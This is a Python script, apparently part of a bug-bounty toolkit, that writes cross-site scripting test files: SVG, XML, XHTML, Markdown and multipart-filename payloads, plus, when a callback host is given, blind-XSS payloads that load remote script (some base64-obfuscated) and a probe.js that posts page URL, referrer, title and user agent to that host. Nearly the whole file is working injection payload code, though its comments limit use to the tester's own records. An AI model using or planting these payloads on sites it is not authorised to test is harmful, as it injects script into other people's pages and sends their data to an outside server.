#!/usr/bin/env python3
"""Build XSS upload/render test files and blind-XSS payloads (offline).

Usage:
  xss_files.py --out DIR [--js 'alert(document.domain)'] [--callback https://your-own.host]

Writes to DIR:
  svg_onload.svg, svg_script.svg, svg_animate.svg, svg_foreignobject.svg, svg_xlink.svg  - SVG upload checks (XS-07/39)
  xml_html_ns.xml, page.html, page.xhtml                    - content-type / namespace confusion (XS-13)
  markdown.md                                               - Markdown / WYSIWYG renderers (XS-08)
  pdf_render.html                                           - HTML-to-PDF generators: proves server-side JS only (XS-30)
  filenames.txt                                             - multipart filename / extension payloads (XS-06)
  blind_payloads.txt, probe.js                              - only with --callback (XS-28)

probe.js reports ONLY page URL, referrer, title, origin, user agent, a timestamp and the payload label.
It does not read cookies, storage, DOM contents, keystrokes or screenshots. Host it on infrastructure you control
(bxss_listener.py) and never use third-party collectors from public notes.
"""
import argparse
import base64
import os
import secrets


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", required=True)
    ap.add_argument("--js", default="alert(document.domain)")
    ap.add_argument("--callback", help="your own blind-XSS host, e.g. https://bx.example-you.net")
    a = ap.parse_args()
    J = a.js
    tid = secrets.token_hex(3)
    os.makedirs(a.out, exist_ok=True)
    files = {
        "svg_onload.svg": f'<svg xmlns="http://www.w3.org/2000/svg" onload="{J}"><rect width="10" height="10"/></svg>\n',
        "svg_script.svg": ('<?xml version="1.0" standalone="no"?>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.1">\n'
                           f'  <rect width="10" height="10"/>\n  <script type="text/javascript">{J}</script>\n</svg>\n'),
        "svg_animate.svg": (f'<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="{J}" attributeName="x" dur="1s"/>'
                            f'<set attributeName="onmouseover" to="{J}"/><rect width="50" height="50"/></svg>\n'),
        "svg_foreignobject.svg": ('<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100">'
                                  f'<body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="{J}"/></body>'
                                  '</foreignObject></svg>\n'),
        "svg_xlink.svg": ('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
                          f'<a xlink:href="javascript:{J}"><text x="10" y="20">bbx click</text></a></svg>\n'),
        "xml_html_ns.xml": ('<?xml version="1.0" encoding="UTF-8"?>\n<html xmlns:html="http://www.w3.org/1999/xhtml">\n'
                            f'  <html:script>{J}</html:script>\n</html>\n'),
        "page.html": f"<!doctype html><title>bbx {tid}</title><img src=x onerror=\"{J}\">\n",
        "page.xhtml": (f'<html xmlns="http://www.w3.org/1999/xhtml"><body><script>{J}</script></body></html>\n'),
        "markdown.md": "\n".join([
            f"[bbx-link](javascript:{J})", f"[bbx-ent](javascript&#58;{J})", f"[bbx-data](data:text/html,<script>{J}</script>)",
            f'![bbx-img](x"onerror="{J})', f"<img src=x onerror={J}>", f"<details open ontoggle={J}>",
            f"[bbx-ref][r]\n\n[r]: javascript:{J}", f"<a href=\"javascript:{J}\">bbx-raw</a>",
            f"```html\n</code><img src=x onerror={J}>\n```", f"<svg><animate onbegin={J} attributeName=x dur=1s>",
            f"[bbx-nl](java\nscript:{J})", ""]),
        "pdf_render.html": ("<!-- HTML-to-PDF proof: shows that JavaScript runs in the renderer and where.\n"
                            "     Do not read local files or internal URLs here (that is ssrf-audit / path-traversal, gated). -->\n"
                            "<p>bbx-pdf <script>document.write('JS:'+(7*7)+' '+location.href+' '+navigator.userAgent)</script></p>\n"),
        "filenames.txt": "\n".join([
            f'"><img src=x onerror={J}>.png', f"<svg onload={J}>.jpg", f"bbx.<svg onload={J}>",
            f"bbx'\"><svg onload={J}>.pdf", f"bbx%22%3E%3Csvg%20onload%3D{J}%3E.png",
            f"bbx\"onmouseover=\"{J}\".png", f"<img src=x onerror={J}>",
            "Set these as the multipart filename (Burp) - most OSes cannot store them as real files.", ""]),
    }
    if a.callback:
        cb = a.callback.rstrip("/")
        loader = f"var s=document.createElement('script');s.src='{cb}/p.js?l=b64-{tid}';document.body.appendChild(s)"
        b64 = base64.b64encode(loader.encode()).decode()
        files["blind_payloads.txt"] = "\n".join([
            "# Replace LABEL with the field name so a hit can be attributed (e.g. contact-name, ua-header).",
            f"# base64 variants report label b64-{tid}; regenerate per field if you need attribution.",
            f'"><script src={cb}/p.js?l=LABEL></script>',
            f"'\"><img src=x id={b64} onerror=eval(atob(this.id))>",
            f"javascript:eval(atob('{b64}'))",
            f'"><input onfocus=eval(atob(this.id)) id={b64} autofocus>',
            f"<svg onload=import('{cb}/p.js?l=LABEL')>",
            f'"><iframe srcdoc="&lt;script src={cb}/p.js?l=LABEL&gt;&lt;/script&gt;">',
            f'\'"--></title></textarea></style></script><script src={cb}/p.js?l=LABEL></script>',
            "# Inject only into your own records / tickets / profile fields, and into headers you send (User-Agent, Referer).",
            ""])
        files["probe.js"] = (
            "(function(){try{var d={u:location.href,r:document.referrer,t:document.title,o:location.origin,"
            "ua:navigator.userAgent,ts:Date.now(),l:(document.currentScript&&document.currentScript.src||'').split('l=')[1]||''};"
            f"var x=new XMLHttpRequest();x.open('POST','{cb}/c',true);x.setRequestHeader('Content-Type','text/plain');"
            "x.send(JSON.stringify(d));}catch(e){}})();\n"
            "/* bbx blind-XSS probe: reports location/referrer/title/UA only. No cookies, storage, DOM or keystrokes. */\n")
    for name, content in files.items():
        with open(os.path.join(a.out, name), "w", encoding="utf-8", newline="\n") as fh:
            fh.write(content)
    print(f"[+] wrote {len(files)} files to {a.out} (id {tid})")
    for n in sorted(files):
        print("    " + n)
    if not a.callback:
        print("    (add --callback https://YOUR-HOST for blind_payloads.txt and probe.js)")


if __name__ == "__main__":
    main()
